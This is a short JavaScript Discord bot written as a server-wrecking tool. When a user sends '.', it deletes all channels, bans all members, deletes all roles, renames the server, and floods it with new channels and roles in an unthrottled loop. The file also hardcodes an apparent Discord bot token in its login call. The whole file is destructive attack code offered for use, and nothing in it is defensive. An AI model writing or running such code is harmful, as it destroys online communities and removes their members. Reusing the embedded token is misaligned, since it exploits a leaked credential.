const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("VENE QUEEN Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("VENE Up", "text");///////bo channel 
        message.guild.createChannel("VENE Up", "voice");////bo voice
        message.guild.createRole({ name: "VENE Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("MTAyMTE3NTA4NDQwMjA5ODI1Ng.GSCKi-.3falVAm6Dgi21wQXCnK9JkWQSG7kByRlTkjoQs")
